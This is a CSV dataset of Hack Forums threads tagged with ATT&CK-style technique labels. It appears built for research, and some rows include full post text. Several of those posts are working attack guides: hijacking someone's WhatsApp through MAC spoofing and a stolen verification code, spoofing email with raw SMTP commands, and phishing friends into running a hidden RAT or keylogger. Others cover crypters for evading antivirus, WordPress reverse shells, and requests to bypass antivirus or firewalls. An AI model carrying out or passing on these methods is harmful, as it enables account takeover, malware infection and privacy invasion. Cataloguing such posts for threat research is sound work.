Topic,Technique,Tactic,Role,Thread,Content
[SMALL TUT] How to run Firefox inside Firefox,Network Service Discovery,,Author,https://hackforums.net/showthread.php?tid=6088634,"Hi All, Yes !!! you can run Firefox inside Firefox just by composing following URL. This is just a trick some might not aware of. What about Opening Firefox inside Firefox which is again in another Firefox..? You maybe find it what's the use of it, but i think its good when you use multiple VPN addons ;) It is extremely simple just type in this URL in Firefox's location bar and there you go! Firefox inside Firefox! copy paste following url in a web browser (mozilla firefox)."
"[TUT] Grab any emails, sundomains, PGP servers using theHarvester kali tool","Acquire Infrastructure,System Services,Valid Accounts",,Author,https://hackforums.net/showthread.php?tid=6088596,"Hi All, Today we will find out about Information Gathering utilizing theHarvester in Kali Linux. Great data information gathering can have the effect between a great penetration test and one that has neglected to give most extreme advantage to the you. It is a tool which provides us information about e-mail accounts, user names and hostnames/subdomains from different public sources like search engines and PGP key server. This tool is designed to help the penetration tester on an earlier stage; it is an effective, simple and easy to use. The sources supported are: Google – emails, subdomains Google profiles – Employee names Bing search – emails, subdomains/hostnames, virtual hosts Pgp servers – emails, subdomains/hostnames LinkedIn – Employee names Exalead – emails, subdomain/hostnames Let’s Begin, If you are using Kali Linux, open the terminal and type theharvester, If not then it can be easily downloaded from here: https://github.com/laramies/theHarvester"
[TUT] How to check if VPN revealing your original IP or not,"Network Service Discovery,Network Sniffing",,Author,https://hackforums.net/showthread.php?tid=6087836,"A new security flaw can reveal your real IP address to prying eyes, even if you're using a VPN, and it's easy to exploit. Here's how it works, and what you can do about it. A recently discovered security flaw allows remote sites to take advantage of WebRTC (Web Real Time Communication, a feature built in to most browsers. A few lines of code is all it takes to remove the location protection you get from using a VPN, and figure out where you're actually located and who your internet service provider really is (who can then tie your address back to who you are specifically.) While the vulnerability is primarily browser-based right now, any application that can render web pages (and uses WebRTC) is affected, meaning anyone who wants to can see past your VPN to where you really are and who you really are. Advertisers, data brokers, and governments can use it to peek through your VPN to find out where your connection is really coming from. How Can I Check If My VPN Is Affected? Firefox and Chrome have implemented WebRTC that allow requests to STUN servers be made that will return the local and public IP addresses for the user. These request results are available to javascript, so you can now obtain a users local and public IP addresses in javascript. This demo is an example implementation of that. Additionally, these STUN requests are made outside of the normal XMLHttpRequest procedure, so they are not visible in the developer console or able to be blocked by plugins such as AdBlockPlus or Ghostery. This makes these types of requests available for online tracking if an advertiser sets up a STUN server with a wildcard domain. To see if your VPN is affected Visit: http://whatismyipaddress.com/ and Note down your actual ISP-provided IP address. Log in to your VPN, choose an exit server in another country (or use whichever exit server you prefer) and verify you're connected. Go back to What Is My IP Address and check your IP address again. You should see a new address, one that corresponds with your VPN and the country you selected. Visit Roseler's WebRTC test page Spoiler (Click to View) If both tools show your VPN's IP address, then you're in the clear. However, if What Is My IP Address shows your VPN and the WebRTC test shows your normal IP address, then your browser is leaking your ISP-provided address to the world."
Need help in Bypassing escan iss,"Impair Defense,Indicator Removal",,Information Seeker,https://hackforums.net/showthread.php?tid=6087931,Hi Guys! I want to access one computer which i have got physical access. I tried to install RAT into it by crypting it. Then also it is detecting by his escan AV. I cannot make changes in his escan AV as the user has put password to escan. What is the way to access it? Your suggestions would be of great help to me.
SMS SPOOFING,"Obtain capabilities,Masquerading",,Information Seeker,https://hackforums.net/showthread.php?tid=6087523,"Hi everyone, Can anyone here help me with a sms spoofing ? I really need it so much."
instagram unusual login,Valid accounts,,Information Seeker,https://hackforums.net/showthread.php?tid=6087971,anyone know instagram unusual login bypass
IOS PenTesting,"Develop capabilities,Brute Force",,Information Seeker,https://hackforums.net/showthread.php?tid=6087568,"Hi HF Members, Is there any Tutorial on IOS pen-testing? I am looking for if any step by step guide available for practice such as manual testing or Tools. Thanks in Advance"
litespeed waf bypass,"Impair Defense,Indicator Removal",,Information Seeker,https://hackforums.net/showthread.php?tid=6087788,Hello guys I need help about bypassing litespeed waf. I appreciate if you help me I can tell the details in discord
Writing a simple python Viewbot,"Acquire Infrastructure,Scheduled Task/Job",,Author,https://hackforums.net/showthread.php?tid=6087025,"Introduction: Hey, so I've always personally loved bots. Bots are fascinating in the way they interact with webpages, the intricate bypassing, and more importantly the money behind them ✌ . This tutorial will give a brief look into: web requests, python, multi-threading, and web-based botting. Part One [What is a Bot?]: Depending on who you ask this definition may vary however I consider a bot to be something that automates a task. For this we will be using python. For setup I highly recommend using sublime text and installing yourself python3.7 however any text editor will do. Once you've got these installed fire up command prompt and type the following command: Code pip install requests This is important so we can get our libraries installed, if we don't get this installed then we can't use any of its modules. Part Two [Writing our Bot]: We are going to want to import the three libraries which we are using for this bot, in this case we will be using the random library , threading library, and also the requests library. After we have that imported lets get onto writing our viewbot itself: Code headers = {'user-agent': ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36""} One of the things which we will want to define is our user agent. When we click on a url we our sending it specific information in the header itself. This information tells the webpage what to load, however with botting scripts we use this make it look like our bot is a real person. next we want to create our function for loading our page, notice how I pass both the argument url,proxy these will be variables which I use in my program itself and MUST be passed w"
How to get FREE VPS/RDP,"Acquire Infrastructure,Drive by compromise",,Author,https://hackforums.net/showthread.php?tid=6072899,VPS METHOD: http://vpsserver.com RDP METHOD: GO TO https://home.cccapply.org/ SELECT crafton hill college FOLLOW THE INSTRUCTION TO CREATE ACCOUNT USE FAKE INFORMATION GENERATOR TO REGISTER (AMERICA - CALIFORNIA) (AGE 18-22) AND GO TO https://azure.microsoft.com/en-us/free/students/ FILL THE REGISTRATION AND....CREATE YOUR RDP!!! VIA AZURE STUDENT ACCOUNT ENJOY YOUR FREE SERVER!!!!!!
Unblock blocked website,Account Manipulation,,Information Seeker,https://hackforums.net/showthread.php?tid=6086841,Google safe browsing blocked my website for som reason. Whaths the best way to deblock it?
How to scrape a site?,"Drive by compromise,Brute Force",,Information Seeker,https://hackforums.net/showthread.php?tid=6085741,"Hi everyone, so this is a simple site. I want to enter a number group (ex: from 000000 to 999999) hit enter and save the result. But unfortunately, there is a small captcha. It is a six number image. (Nothing series. or ip ban etc) Is there a tool to do this? Or a tutorial / course link?"
[Tiny TUT] Reverse shell on wordpress - Part II,Command and Scripting Interpreter,,Author,https://hackforums.net/showthread.php?tid=6086503,"Hello Everyone, I am making this tutorial as per my experience and for learning purpose. This Thread is related with WordPress security testing to recognize what will be conceivable technique to exploit WordPress by privileging administrator access. I have as of now arrangement WordPress in my local machine. We are not using wpscan tool which is very well known for WordPress scanning, wpscan is a tool for identifying vulnerable plugins and themes of WordPress. In this Part II i am gonna Injecting Malicious code in WP_Theme. You can check my PART I in same section as I am gonna explore several methods using small but effective methods. Let's Begin : There's likewise a second technique that lets you generate web server shells. In the event that you have a username and password for the admin, sign in to the administrator board and inject malicious PHP code with the use of a WordPress theme. Login into WP_dashboard and explore the appearance tab."
How to crack inside a auth based software? Someone managed to crack it really easily,"Native API,Windows Management Instrumentation",,Information Seeker,https://hackforums.net/showthread.php?tid=6085920,So someone i know cracked into this program and he said all you gotta do is patch the .dll or something like that but i did not understand what he meant. Could anyone explain? Its based on user and pass auth Link: http://www.mediafire.com/file/2mh83mutsc...r.msi/file
How to unblock yourself on Whatsapp,Account Manipulation,,Author,https://hackforums.net/showthread.php?tid=6072903,"IF SOMEONE BLOCKS YOU Step 1: Write down your blocker’s phone number If you have the contact that blocked you saved on your phone, write it down somewhere and delete it from your phone. Step 2: Back up your chats I believe you already know how to back up your WhatsApp chat (both messages and media files). Well, if you don’t then here is a quick guide to creating a Google Drive backup: Open WhatsApp. Go to Menu Button > Settings > Chats > Chat backup. Tap Back up to Google Drive and set up the backup frequency to your liking. You will be prompted to select a Google account that you will back up your chat history to. If you do not have a Google account, tap Add account when prompted. Please remember the Google account you are using for the backup. Tap Back up over to choose the network you wish to use for backup. Please note that backing up over cellular may result in additional data charges. Step 3: Delete your WhatsApp account Go to account settings on your WhatsApp and delete your account. By deleting your number, it means you are no longer active on WhatsApp so technically, you cannot block someone who’s not on WhatsApp. Whoever blocks you will no longer have you on the blocked list. Step 4: Clear WhatsApp data Now go to your phone settings > app > WhatsApp and clear the data. Step 5: Reactivate WhatsApp Open your WhatsApp and register your number on the WhatsApp platform. This time, you are registering for the first time over again. Step 6: Restore Chats Restore your chat back up. Make sure the same Google account that was used to perform the backup has been added to your phone. Uninstall and reinstall WhatsApp. After verifying your number, you will be prompted to restore your messages and media from Google Drive. After the restoration process is complete, tap Next and your chats will be displayed once initialization is complete. After restoring your chats, WhatsApp will begin restoring your media files. NOTE: You need to restore from the backup on your google drive but if you didn't do so, WhatsApp will automatically restore the backup from your local storage memory which could be SDcard or phone internal memory as the case may be. Step 7: Re-add contact Lastly, save the contact you wrote down earlier back on your phone. Now look for the person/ contact that blocked you in the first place and send a message. This is how to unlock your WhatsApp account whenever someone blocks you. I hope this is helpful."
[Tiny TUT] Reverse shell on wordpress - Part I,Command and Scripting Interpreter,,Author,https://hackforums.net/showthread.php?tid=6086210,"Hello Everyone, I am making this tutorial as per my experience and for learning purpose. This Thread is related with WordPress security testing to recognize what will be conceivable technique to exploit WordPress by privileging administrator access. I have as of now arrangement WordPress in my local machine. We are not using wpscan tool which is very well known for WordPress scanning, wpscan is a tool for identifying vulnerable plugins and themes of WordPress. In this Part I i am gonna use Metasploit. You can check my other threads in same section as I am gonna explore several methods using small but effective methods. Let's Begin : Tool Used : Metasploit Framework Requirement: Host machine: WordPress Attacker machine: Kali Linux WordPress Credential: admin: admin (in our case) Action : Lets get to the WordPress webpage locally As you can see that you approach of WordPress administrator support over the internet browser, for getting web shell we have to misuse this CMS. There are numerous techniques to abuse WordPress, how about we go for certain tasks. Metasploit Framework: The absolute first technique that we have is Metasploit structure, this module takes a admin username and password, signs into the administrator board, and transfers a payload bundled as a WordPress module. Since this is confirmed code execution by structure due to authentication, it should take a shot at all forms of WordPress and therefore, it will give meterpreter session of the webserver. Code"
Identifying risk on Dark web,System/Owner User Discovery,,Information Seeker,https://hackforums.net/showthread.php?tid=6085939,"I am looking for an tutorial to understand how nowadays most of software's in organization identify risk over a Dark Internet. There are only several keywords inside a software and its search over even in locked forums such as to open some post you need to pay some credits. I wanted to understand how does it works how its search the data, how those software access to closed sources."
Is it worth buying a bruteforcing tool for emails?,"Brute force,Valid accounts",,,https://hackforums.net/showthread.php?tid=6084539,
[VERY HQ] HOW TO REDUCE THE RATIO OF DETECTION ON YOUR MALWARE MORE THAN HALF,"Obfuscated files or information,Exploitation for Defense Evasion",,,https://hackforums.net/showthread.php?tid=6081250,
Cracking HWID protected program,"Protocol Tunneling,Proxy",,,https://hackforums.net/showthread.php?tid=6085528,
How to bypass Google Safe Browsing?,Proxy,,,https://hackforums.net/showthread.php?tid=5845145,
Visual Basic 6 Question,"Develop capabilities, Exploitation of Remote Services",,,https://hackforums.net/showthread.php?tid=6085332,
Core Impact 7.5 activation,Server Software Component,,,https://hackforums.net/showthread.php?tid=95839,
[Kali Linux] How to find vulnerabilities on websites.,"Automated Collection,System Services,Abuse Elevation Control Mechanism",,,https://hackforums.net/showthread.php?tid=6083507,
Problems accessing my Gmail,"Exploitation for credential access,Steal Web Session Cookie",,,https://hackforums.net/showthread.php?tid=6083161,
Facebook profile shield.,Develop capabilities,,,https://hackforums.net/showthread.php?tid=6083168,
Hack webmails,"Brute force,Valid accounts",,,https://hackforums.net/showthread.php?tid=6083109,
Best Tools to protect your online privacy these days,Obfuscated files or information,,,https://hackforums.net/showthread.php?tid=6081931,
Change IP Address Every 5 Seconds High Security,Network Sniffing,,,https://hackforums.net/showthread.php?tid=6081010,
cloudfare WAF bypass,"Impair Defense,Exploitation for defense evasion",,,https://hackforums.net/showthread.php?tid=6075945,
Free Guide to Nullbyte-Poisoning (Autor Unknown),Develop capabilities,,,https://hackforums.net/showthread.php?tid=6082307,
Can't access my router,"Exploitation of Remote Services,Adversary-in-the-Middle",,,https://hackforums.net/showthread.php?tid=6082161,
I need access to my Gmail account,Valid accounts,,,https://hackforums.net/showthread.php?tid=6081801,
How to hack into peoples WiFi Router?,"Exploitation of Remote Services,Adversary-in-the-Middle",,,https://hackforums.net/showthread.php?tid=6059648,
Taking control of android devices - Tutorial - part 1,"Develop capabilities,Exploitation for Client Execution",,,https://hackforums.net/showthread.php?tid=6077291,
[NEW][FUD] How To Crypt RAT/Keylogger Without Crypter [FUD][NEW],"Remote services,External remote services",,,https://hackforums.net/showthread.php?tid=4757158,
How to Install and Run Kali Linux on any Android Smartphone,"Acquire Infrastructure,System Services",,,https://hackforums.net/showthread.php?tid=6081011,
Tut Hacking Android - Beginner,"Acquire Infrastructure,System Services",,,https://hackforums.net/showthread.php?tid=6080944,
Seven Deadly Sins of Social Engineering,"Phishing,Trusted Relationship,Exploit Public-Facing Application",,,https://hackforums.net/showthread.php?tid=6080926,
Can Metersploit connection be blocked?,Remote Services,,,https://hackforums.net/showthread.php?tid=6080480,
Help needed on using Putty.exe,"Indirect Command Execution,Phishing",,,https://hackforums.net/showthread.php?tid=6077803,
Common Ports and there uses/meanings,Network Sniffing,,,https://hackforums.net/showthread.php?tid=6077587,
How To Hack WPA/WPA2 Wifi on Kali Linux Using Wifite [TUTORIAL] [For Noobs],"Acquire Infrastructure,System Services",,,https://hackforums.net/showthread.php?tid=5303252,
Inspecting MacOS's KnocKnock for VirusTotal API Key,"Impair Defense,Exploitation for defense evasion",,,https://hackforums.net/showthread.php?tid=6079862,
Exporting Fb email data,"Phishing,Valid Accounts",,,https://hackforums.net/showthread.php?tid=6077382,
Extracting API keys from software,"Drive by compromise,Valid Accounts",,,https://hackforums.net/showthread.php?tid=6077630,
Violation of the WPS pin code - Tutorial,Brute force,,,https://hackforums.net/showthread.php?tid=6066493,
Advanced attacks on WiFi infrastructure and its clients - Tutorial - part 2,"Acquire Infrastructure,System Services",,,https://hackforums.net/showthread.php?tid=6072406,
How to hack using Social Engineering,"Phishing,Trusted Relationship,Exploit Public-Facing Application",,,https://hackforums.net/showthread.php?tid=5998431,
Recover your deleted files quickly and easily [100% WORKED],Command and Scripting Interpreter,,,https://hackforums.net/showthread.php?tid=6078427,
"[tutorial] Basic HTTP Methods, API, and others","Develop capabilities,External Remote Services",,,https://hackforums.net/showthread.php?tid=6020852,
Free Windows RDP for 7 days (re-usable).,"Remote Services,Remote System Discovery",,,https://hackforums.net/showthread.php?tid=6067440,
Account Comprimisation,"Drive by compromise,Valid Accounts",,,https://hackforums.net/showthread.php?tid=6077891,
Forgot wordpress password? Reset it through phpMyAdmin,"Credentials from Password Stores,Forge Web Credentials",,,https://hackforums.net/showthread.php?tid=6077621,
Password Protected ZIP Files and You,Unsecured credentials,,,https://hackforums.net/showthread.php?tid=6077658,
Intro to powershell for beginner hackers,Command and Scripting Interpreter,,,https://hackforums.net/showthread.php?tid=6077403,
How to find vulnerable websites & NetSparker Crack,External Remote Service,,,https://hackforums.net/showthread.php?tid=6077402,
Dox template and useful info,"Drive by compromise,Exploitation for credential access",,,https://hackforums.net/showthread.php?tid=6077387,
Taking control of android devices - Tutorial - part 2,"External Remote Service,System Service",,,https://hackforums.net/showthread.php?tid=6077292,
[TUT] Hide DATA in an image (Kali Linux),"Acquire Infrastructure,System Services",,,https://hackforums.net/showthread.php?tid=6075842,
H8mail Advanced Mail OSINT tools,Account discovery,,,https://hackforums.net/showthread.php?tid=6073698,
"RDP, VMware or Sandboxie",Remote Services,,,https://hackforums.net/showthread.php?tid=6076482,
[Deface] Wordpress Exploit : Thousands Wordpress sites vulnerable. [Deface],"Defacement,Exploit Public-Facing Application",,,https://hackforums.net/showthread.php?tid=2337691,
[TUT] [2020] How To Bruteforce Instagram Login Anonymously [Kali Linux],"Brute force,Acquire Infrastructure,System Services",,,https://hackforums.net/showthread.php?tid=6075831,
HOW-TO: HACK INSTAGRAM ACCOUNTS | EASY | BRUTE |,"Brute force,Remote Services",,,https://hackforums.net/showthread.php?tid=6069724,
Spynote v6.4 Problem,"Remote Services,Automated Collection",,,https://hackforums.net/showthread.php?tid=6073260,
How To Merge a pdf file to exe [ Good method ],"Phishing,Masquerading",,,https://hackforums.net/showthread.php?tid=6076151,
[TUT] [2020] How To Hack Android Devices Remotely,Remote Services,,,https://hackforums.net/showthread.php?tid=6075828,
How to Permanently Activate Windows 10,Valid accounts,,,https://hackforums.net/showthread.php?tid=6059437,
exploit for sudo binary perms for linux privilege ecalations,"Abuse elevation control mechanism,Exploitation for Privilege Escalation",,,https://hackforums.net/showthread.php?tid=6075946,
"[TUT] Tcpflow To Monitor, Capture & Dump Packets","Network sniffing,Network Service Discovery",,,https://hackforums.net/showthread.php?tid=6075791,
[TUT] Best Free and Paid Online Cracking WPA/WPA2,"Acquire Infrastructure,Obtain capabilities",,,https://hackforums.net/showthread.php?tid=6075845,
[TUT] Configuring Proxychains for Tor,"Proxy,System Services",,,https://hackforums.net/showthread.php?tid=6075839,
[TUT] How to make simple Wordlists with Crunch,Brute force,,,https://hackforums.net/showthread.php?tid=6075824,
"Questions Like: ""I want to learn hacking""","Indirect Command Execution,Template Injection,Exploitation for Credential Access",,,"https://hackforums.net/showthread.php?tid=6075819,6075819",
[TUT] Discover IPv6 Network Range & Hosts from an IPv6 Enabled Network,"Network Sniffing,Remote System Discovery",,,https://hackforums.net/showthread.php?tid=6075780,
"Facebook trick: How to ""hack"" facebook password",Phishing,,,https://hackforums.net/showthread.php?tid=1245930,
[Android | Old] Bypassing Pattern Lock,"Use Alternate Authentication Material,Modify Authentication Process",,,https://hackforums.net/showthread.php?tid=6071152,
Pentester academy course collection paid for free,Hijack Execution Flow,,,https://hackforums.net/showthread.php?tid=5943747,
[Tut][FREE]How to crash your enemies KIK method. [Kik exploit],"Endpoint Denial of Service,Network Denial of Service",,,https://hackforums.net/showthread.php?tid=4566867,
"BTC Stealer , Direct Transfer of BTC To Your BTC Address (LTC Supported )",Valid Accounts,,,https://hackforums.net/showthread.php?tid=4750637,
Bypass SMS Verification,Multi-Factor Authentication Interception,,,https://hackforums.net/showthread.php?tid=6072896,
How to hack ROBLOX accounts?,Phishing,,,https://hackforums.net/showthread.php?tid=6074016,
Java Spyware Open-Source (HOW-TO),"Input Capture,Steal Application Access Token,Masquerading",,,https://hackforums.net/showthread.php?tid=6072886,
[TUT] HOW TO UPLOAD SHELL [TUT],"Command and Scripting Interpreter,Remote Services",,,https://hackforums.net/showthread.php?tid=1946418,
Control of users on the network using Evillimiter,"Network sniffing,Network Service Discovery",,,https://hackforums.net/showthread.php?tid=6074128,
[Tutorial] REVERSE SHELL SERIES - The Basics (Bonus) [Tutorial],"Command and Scripting Interpreter,Remote Services",,,https://hackforums.net/showthread.php?tid=6074097,
*TUT* How to setup Cain & Able for getting ip's,Remote System Discovery,,,https://hackforums.net/showthread.php?tid=404099,
Fud- Logger CoDeR,"Input Capture,Steal Application Access Token,Masquerading",,,https://hackforums.net/showthread.php?tid=6073850,
GhostRat V0.1f STABL RAT,"External Remote Service,Remote Services",,,https://hackforums.net/showthread.php?tid=6073964,
INJECTING CODES,"Compromise Client Software Binary,Masquerading",,,https://hackforums.net/showthread.php?tid=6073882,
[HOW TO] Block BlockAdblock,Phishing,,Author,https://hackforums.net/showthread.php?tid=6073789,"I have been using websites that have anti AdBlock on it. I have made a thread before similar to this but I found out that it isn't working anymore the way it's supposed to be. So I found this little trick to get by with it. I have only tried this for BlockAdblock, and I am not 100% sure it'll work to other blockers."
Hack an Whatsapp Account Through MAC spoofing attack,"Network Sniffing,Remote System Discovery",,Author,https://hackforums.net/showthread.php?tid=6072908,"First of all the requirements of this procedure are: 1. Mobile Phone Rooted 2. Target's Phone for 5 minutes 3. Busybox and Terminal App installed on your android device 4. Wifi Scanner ( if you can't reach the target's phone for getting his / her mac address through settings ) Step 1: Uninstall WhatsApp from your phone or device. You'll install it again at the end of the method, but you'll need to configure it differently, and the easiest way to make sure you'll be able to do that correctly is to completely uninstall it now. Step 2: Obtain your target's phone. You'll need it for two different steps throughout the process, but this shouldn't take too long - you should be able to return it before your target starts to miss it. Step 3: Find your target's phone's Media Access Control (MAC) address. A MAC address is a unique identifier assigned to your phone or other device that essentially serves as its online identity. Find and write down your target's MAC address. It takes the form of six pairs of letters or numbers, separated by colons (01:23:45:67:89:ab). On an Android, find this in Settings → About phone → Status → Wi-Fi MAC address. On an iPhone, go to Settings → General → About → Wi-Fi Address. On a Windows phone, look in Settings → About → More info → MAC address. On a BlackBerry, go to Options → Device → Device and Status info → WLAN MAC. Step 4: . Find your MAC address using the instructions above. Make sure to save it somewhere secure, as you'll want to change your device back to that address once you're done. Step 5: Change (""spoof"") your phone's MAC address to that of your target. This will allow your phone to pass as your target's, letting you convince WhatsApp that you are your target when you log in. On an iPhone or other device, install a MAC spoofing app like MacDaddy X or WifiSpoof. Use that to change your MAC address. On Android, install BusyBox and the Terminal Emulator (apps available for free on Google Play). In the terminal, type ""ip link show"" to see a list of interfaces. Identify the one that has your MAC address -- for this example, we'll use the eth0 interface. In the terminal emulator, enter ""ip link set eth0 address XX:XX:XX:XX:XX:XX"" and ""ip link set eth0 broadcast XX:XX:XX:XX:XX:XX"", where eth0 is the interface you identified and XX:XX:XX:XX:XX:XX is your target's MAC address. To check that you've successfully changed your MAC address, enter ""ip link show eth0."" Step 6: Change (""spoof"") your phone's MAC address to that of your target. This will allow your phone to pass as your target's, letting you convince WhatsApp that you are your target when you log in. On an iPhone or other device, install a MAC spoofing app like MacDaddy X or WifiSpoof. Use that to change your MAC address. On Android, install BusyBox and the Terminal Emulator (apps available for free on Google Play). In the terminal, type ""ip link show"" to see a list of interfaces. Identify the one that has your MAC address -- for this example, we'll use the eth0 interface. In the terminal emulator, enter ""ip link set eth0 address XX:XX:XX:XX:XX:XX"" and ""ip link set eth0 broadcast XX:XX:XX:XX:XX:XX"", where eth0 is the interface you identified and XX:XX:XX:XX:XX:XX is your target's MAC address. To check that you've successfully changed your MAC address, enter ""ip link show eth0."" Step 7: Get the confirmation code from your target's phone. This code will be sent to their phone number as part of the WhatsApp configuration process. Access their phone one last time to get that verification code. Enter it into WhatsApp on your phone when prompted, and you're all ready to go. If you don't want your target to find out about your spoofing, make sure to delete the confirmation code from their phone before they can see it. Step 8: When you no longer need to access your target's WhatsApp account, change your MAC address back to what it was. Repeat the instructions to change it, but this time change it to your original address rather than your target's. This will restore your phone to how it was originally, which will ensure that there are no future problems with Internet usage or connectivity."
[REQ] - Hakin9 Drone Hacking: Exploitation and Vulnerabilities,"Develop capabilities,Hijack execution flow",,Information Seeker,https://hackforums.net/showthread.php?tid=6073133,"Dear all, I'm trying to find this journal in PDF: https://hakin9.org/product/drone-hacking...abilities/ Thanks for your support"
Retrieve (and spoof) email addresses from a website in 3 easy steps,"Valid accounts,Masquerading,Exploit Public-facing Application",,Author,https://hackforums.net/showthread.php?tid=5588411,"In this tutorial, you will need: Either Kali Linux or an operating system with Nmap installed Intro: Many websites have their own email addresses that they use to send and receive emails. How do they do this? They have an SMTP (Simple Mail Transport Protocol) server installed on their system, usually on port 25. This server contains a database of all the website's emails, and websites often leave it unsecured.So how would you leak their emails, send them funny messages, or even spoof their emails? Well read this tutorial and find out! Step 1: Open up your command line. Step 2: We will test to see whether or not the website left their SMTP server open. Enter the following command: Code telnet [website address] 25,465,587 If you receive a message like ""Connected to [IP Address]"" then congratulations! Their server is open. If not, then try ports 465 and 587. Step 3: Exit from telnet. We will now use nmap to extract email addresses from the SMTP server. Enter the following command: Code nmap --script smtp-enum-users.nse -p 25 [website address] Nmap should tell you all the user accounts on the server. Good, excellent! Now you have their email addresses. You can leak them to the public or send them random shit. If that's all you wanted to do then you can stop reading this tutorial. But what if you want to spoof their emails? How to Spoof: Step 1: Open up your command line Step 2: Enter the command Code telnet [website address] 25 Step 3: You are required to say hello to the server. Type the command: Code HELO [type anything here] and wait for the server to respond back. If you receive no response, try Code EHLO instead. Step 4: Type in the email address you want to spoof. Code MAIL FROM: [fake username]@[website address] and press enter Step 5: Type the email you would like to send a message to Code RCPT TO: [username]@[website address] and press enter Step 6: Type Code DATA and press enter. Then type Code SUBJECT: [any subject here] and press enter twice. Step 7: Begin typing your message. When you are done just type a single ""."" on a new line and press enter. Your message will be se"
[NEW]Hack almost everyone. every FACEBOOK and EMAIL (via facebook) 100% hack,"Input Capture,Remote Access Software,Masquerading",,Author,https://hackforums.net/showthread.php?tid=2633783,"TUTORIAL: Hack anyone Facebook,email or PC.. This tutorial is like a spreading tutorial way basically. But more precise and powerful. MOSTLY I HAVE HACKED GIRLS WITH THIS METHOD (because they don't get fooled so easily by a poser and other shit. So this thing can do it)😏 REQUIREMENTS:- 1) A fully FUD server(SERVER BEING FUD is the most important part of the hack) 2) Patience That's all... Now coming to the hack... there are basically thousands of tutorials in HF about keylogger,RAT,stealer and crypting... so read one and make your server fully fud... Now do just as what i say:- 1) go to ""http://emailattack.host22.com/emailspoof.php"" and leave that tab open 2) now login to your facebook and copy the username of the person(FB username) you want to hack like this.... http://imageshack.us/photo/my-images/543/username.png so basically the name after the www.facebook.com/ is the username... in my example ""RANDOM"" is the username.... if the link shows url like ""https://www.facebook.com/profile.php?id=100003721756694"" then you cannot use this method on them.... 3) as you are the friend of the person you must know who he his/her best friend or just close friend.... so basically get his email id attached to his Facebook like http://imageshack.us/photo/my-images/152/contactw.png [this can be hard if you don't have this person as your friend] anyways you can ask his/her email id if you know him.... 4)Now just open that spoofer tab and paste the info as follows:- in Spoofed Email: the id you stolen from the contact info: ex: something@anymail.com in Targets Email: username@facebook.com, ex: random@facebook.com in Reply Email: same as spoofed email in message title: hi or whatever in message body : Hi check out my new pics uploaded here: ""link of your key-logger,rat or whatever"" HE/SHE WILL RECEIVE THAT MESSAGE FROM THE SPOOFED PERSON AND AS HE/SHE IS HER CLOSE FRIEND SHE WILL DEFINITELY DOWNLOAD AND RUN IT🤗 VICTIM WILL TAKE SOME TIME TO READ THE MESSAGE>DOWNLOAD THE FILE>RUN IT. THAT'S WHY I SAID PATIENCE IS A REQUIREMENT 👹.... PRO-TIP: 1) If you are using the message from the example then i suggest you to download some of the spoofed person(victim friend) pictures and use icon-changer to change your server icon to JPEG icon and put all that pics and your server to an .rar file and upload it to the hosting site.... Lol,,,, no one sees the extension if you do this thing.. 2) use rat's crew extension spoofer to change the extension to JPEG and change server icon to JPEG too.…"
A crypter in C# Bypass antivirus Runtime,Impair Defense,,Author,https://hackforums.net/showthread.php?tid=6072910,"A crypter in C# is not as useful as one in C++, but that’s besides the point. C++: Complex, but handles the low-level stuff much better C#: Very easy; excellent for creating a basic introduction to crypters. I’ll cover the aspects necessary to built a crypter, and because it’s in C#, I can omit the complex, low-level stuff usually associated with this technique. and stfu if u dont understand shit How does a Runtime Crypter work? pls look at ma pervious thread about this it litrly the same thing but its c# instead c++ here On the attacker’s machine (Crypter)"
How to change the mac address of your Router,"Masquerading,Hide Artifacts",,Author,https://hackforums.net/showthread.php?tid=6072901,"A simple noob tutorial. All network hardware is assigned a special unique identifier, the Media Access Control (MAC) address during production by its manufacturer. It helps identify the device on the network. Sometimes it is necessary to change that id and use a particular MAC address to be able to connect to your ISP. Below is a general guideline on how to do so on many routers/gateways and ADSL/VoIP/cable modems. Here are the necessary steps to change the MAC address on your device: 1. Get to the web admin interface of your device. You will have to find your router/modem's IP address. If you're connected to it, you can drop to command prompt and type: ipconfig (the IP address of your ""Default Gateway"" should be the router/modem's IP). Some of the most common IPs are: Motorola SB modems: 192.168.100.1 Other modems/routers: 192.168.1.1 You can also lookup the default IP and login information of your device in our hardware database. 2. Find the correct menu to change your MAC address It is usually in ""Setup > Advanced"", you're looking for a menu called ""MAC Address Clone"". This should let you enter your own MAC address, it is designed to clone the MAC address of your network card. Note that this menu may not be available on all devices, or it may only be available to be provisioned by your ISP. In such cases, you may have to call them and ask them to ""reprovision"" your modem."
